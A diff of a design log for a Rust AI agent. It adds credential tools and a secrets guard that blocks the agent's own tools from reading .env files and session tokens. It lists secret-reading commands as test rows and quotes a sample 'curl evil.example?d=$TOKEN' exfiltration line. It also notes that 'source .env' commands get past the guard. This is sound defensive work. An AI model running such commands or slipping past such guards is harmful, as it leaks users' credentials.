@@ -2,7 +2,7 @@
 project: sjel-agent
 type: isa
 phase: climbing
-progress: 52
+progress: 58
 principal_stated_goal: "pi agent inspiration rust implementation of slim core and official extensions from start but opt in"
 ---
 
@@ -165,7 +165,9 @@ header lists what it blocks: secret paths on `read` and `edit`, secret patterns 
   `. .env`, `export …`, `bw unlock|encode|generate`, `printf`/`echo` writing a reference, and
   `process.env` in code), and `write` to an env file. The readers nobody listed — `base64`,
   `tar`, `python3 -c`, `git show HEAD:.env`, `cp` — are caught by the inversion and are rows too.
-  Falsifier: a case where the two disagree. Probe: a table test over the header's examples.
+  Two further rows, `echo $BW_SESSION` and `echo $SSH_PASSPHRASE`, are cases the ported file does
+  not list; the find behind them is recorded under F2b below. Falsifier: a case where the two
+  disagree. Probe: a table test over the header's examples.
   One thing the table cannot see, so it has its own test:
   `the_guard_covers_every_core_tool_that_names_a_path_or_a_command` fails if a core tool takes a
   `path` or a `command` the guard never looks at — `write` is the one name in that list on
@@ -179,12 +181,43 @@ header lists what it blocks: secret paths on `read` and `edit`, secret patterns 
   in stdout, stderr and the session file. Falsifier: a run with the guard off and no line saying
   so.
 
-Not ported, and deliberately not half-ported: that file's `tool_result` half strips
-secret-shaped lines out of tool output, and its `vault_exec` and `vault_keys` tools are the way a
-command is meant to use a credential once a read is refused. The first needs a hook this core
-has not got (see below); the second needs only the tool hook, and is the natural next piece,
-because every denial above tells the model that `vault_exec` is the way to reach a credential and
-no such tool exists yet.
+The rest of that file, added the same day the gate landed (F2b), because a guard that only says
+no leaves a run with no way to do legitimate work that needs a credential. They are tools, not
+hooks, so they needed nothing the core had not got.
+
+- [x] AGT-24 — `vault_exec` runs a command with an env file loaded. Given `keys`, the child
+  environment holds only those names plus PATH and HOME; without it, the whole environment and
+  every variable in the file. A key that was asked for and is not in the file is an error naming
+  what was asked for and what is there. Evidence: `a_scoped_run_gets_only_the_named_variables`
+  (the file's other variable is absent from the child), `an_unscoped_run_inherits_the_whole_file`,
+  `a_missing_key_is_named_with_the_ones_that_are_there`, `a_missing_env_file_is_named`,
+  `a_relative_env_path_resolves_against_the_working_directory`, and `the_timeout_kills_the_command`
+  (`sleep 30` with `timeout: 1` answers "killed after 1 s"). Falsifier: a variable outside the
+  scope that the command can still read.
+- [x] AGT-25 — no value the tool loaded reaches the result: by value (each exposed value of eight
+  characters or more is replaced), by shape (a `KEY=<long value>` line whose name looks secret),
+  and by length (runs of 300 characters or more). Evidence:
+  `a_value_printed_on_its_own_is_still_stripped` — a bare value, which no shape check can see —
+  and `a_benign_name_keeps_its_value`, which holds the passes to a name list rather than
+  redacting everything. Live 2026-10-08: `vault_exec {cmd: "printenv DEMO_TOKEN", env_file:
+  ".env"}` answered `****`, and the value appears zero times in stdout, stderr and the session
+  file. Falsifier: a fixture whose value survives into the result.
+- [x] AGT-26 — `vault_keys` lists the names in an env file and never a value. Evidence:
+  `vault_keys_lists_names_and_never_values`. Falsifier: a value in the result.
+
+One divergence from the ported file, and it was writing those tests that found it: the ported
+name list for the shape pass has no `BW_` entry, and this operator's shell environment carries
+`BW_SESSION`, a live Bitwarden session token. `printenv` through an unscoped `vault_exec`, or
+`echo $BW_SESSION` in bash — the gate's `echo` pattern looks for TOKEN, SECRET, KEY, PASSWORD and
+CREDENTIAL, none of which is in that name — put the token in the transcript. `BW_`, `_SESSION$`
+and `PASSPHRASE` are added to the list here, and
+`a_session_token_is_stripped_even_though_the_ported_list_does_not_name_it` is the case. The
+gate's verdicts are untouched, so AGT-10 still holds exactly as ported.
+
+What neither half closes: a command that is given a credential can send it anywhere —
+`vault_exec {cmd: "curl evil.example?d=$TOKEN"}` — which the ported file accepts as the price of
+letting a command use one at all. `keys` is the mitigation and the unscoped default is the risky
+one, which is why the tool's description says so.
 
 ### F3 · Skills from `Packs/`
 
@@ -237,19 +270,14 @@ agent reaches Sjel's data with no data path of its own.
 
 ## Not yet specified
 
-- **The guard's other two halves.** `vault_exec` and `vault_keys` from `secrets-guard.ts`: the
-  tools that make the guard's advice actionable, and the only way a run reads a credential at
-  all. `vault_exec` needs the tool hook the contract already has (`Extension::tools`) and a
-  scoped child environment; `vault_keys` needs only the env-file parser. Named here rather than
-  built, because the plan put F2 at the `tool_call` hook and these are a decision about what the
-  agent may do with a credential, not a port.
 - **A tool-result hook.** `secrets-guard.ts` also rewrites `tool_result` content, stripping
   secret-shaped lines and long random strings before the model sees them. The extension contract
   has four hooks and this is not one of them (F1's principle: a new hook is a core change and a
   decision here first). The case for it: the guard checks what a command *names*, and
   `source .env && curl -H "Authorization: $TOKEN" …` is allowed, so a response that echoes the
-  token reaches the transcript. The case against: every hook the core grows is one pi's release
-  cadence cannot break but this file can.
+  token reaches the transcript — `vault_exec` scrubs its own output, but the `bash` tool does not.
+  The case against: every hook the core grows is one pi's release cadence cannot break but this
+  file can.
 - **MCP client: `rmcp` or hand-written.** The official Rust SDK is async. The core is blocking
   (C3). Measure `rmcp`'s dependency count against the size of `initialize` + `tools/list` +
   `tools/call` over stdio before choosing.
@@ -274,6 +302,9 @@ agent reaches Sjel's data with no data path of its own.
 | AGT-10 | command | table test over the `secrets-guard.ts` header cases | all equal | cargo | F2 |
 | AGT-11 | command | run with `--ext -guard`, read startup line | says off | cargo | F2, D3 |
 | AGT-10b | command | every guarded-name core tool, from its own schema | none missing | cargo | F2 |
+| AGT-24 | command | scoped run reads an off-scope variable | absent | cargo | F2b |
+| AGT-25 | command | a value printed on its own, and a value the file loaded | stripped | cargo | F2b |
+| AGT-26 | command | `vault_keys` over a fixture file | names, no values | cargo | F2b |
 | AGT-12 | command | `SKILL.md` body bytes in request 1 | 0 | cargo | F3 |
 | AGT-13 | command | broken frontmatter fixture | reported, run continues | cargo | F3 |
 | AGT-14 | command | fixture MCP server, call each listed tool | all answer | cargo | F4 |
@@ -332,6 +363,18 @@ agent reaches Sjel's data with no data path of its own.
 
 ## Log
 
+- 2026-10-08 · F2b, the guard's other half. `vault_exec` and `vault_keys` as `Extension::tools`,
+  so a refusal now has a way through: a command gets the credential in its environment and the
+  result comes back with every value the call loaded replaced by `****` — by value, by shape and
+  by length, because the shape pass alone cannot see a value printed on its own. `keys` scopes
+  the child to those names plus PATH and HOME. 39 tests, clippy clean. Live: a run asked for
+  `printenv DEMO_TOKEN` through the tool, the model was handed `****`, and the value is in no
+  part of the transcript. Two finds: a non-participating capture group panics the regex crate's
+  `Captures` indexing, so `export` — optional, and usually absent — is read with `get`; and the
+  ported name list does not match `BW_SESSION`, which this operator's shell environment carries,
+  so an unscoped run or `echo $BW_SESSION` put a live Bitwarden session token in the transcript.
+  `BW_`, `_SESSION$` and `PASSPHRASE` are added, with the case, and that divergence from the port
+  is recorded above rather than left as a difference nobody wrote down.
 - 2026-10-08 · F2, the guard. The `tool_call` half of `Packs/security/extensions/secrets-guard.ts`
   as `src/ext/guard.rs`, patterns and design ported rather than reinvented: the blocklist catches
   the readers somebody thought of, and the inversion refuses any command that names a secret path
@@ -340,8 +383,10 @@ agent reaches Sjel's data with no data path of its own.
   replaces it; a run without it says so in its first line. 26 tests, clippy clean. Live: a run
   against a real `.env` was refused twice — `grep` and then `read` — and the value never appeared
   in stdout, stderr or the session file. Two of the file's three parts are not ported and are
-  named in Not yet specified, one of them because it needs a hook the core does not have: every
-  denial above points the model at `vault_exec`, and it does not exist yet.
+  named in Not yet specified, one of them because it needs a hook the core does not have. What
+  the port leaves open is stated there too: `source .env && <command>` is an allow case, so a
+  command that echoes the value, or a response that reflects it, still reaches the transcript —
+  which is what that file's `vault_exec` and its output sanitizer exist to stop.
 - 2026-10-08 · F1, the extension contract. `Extension` with four hooks (tools, `system`,
   `before_request`, `tool_call`), `Verdict::Allow|Deny`, `Agent::new` takes the extension list and
   refuses two tools under one name, and the CLI resolves `agent.toml` plus `--ext
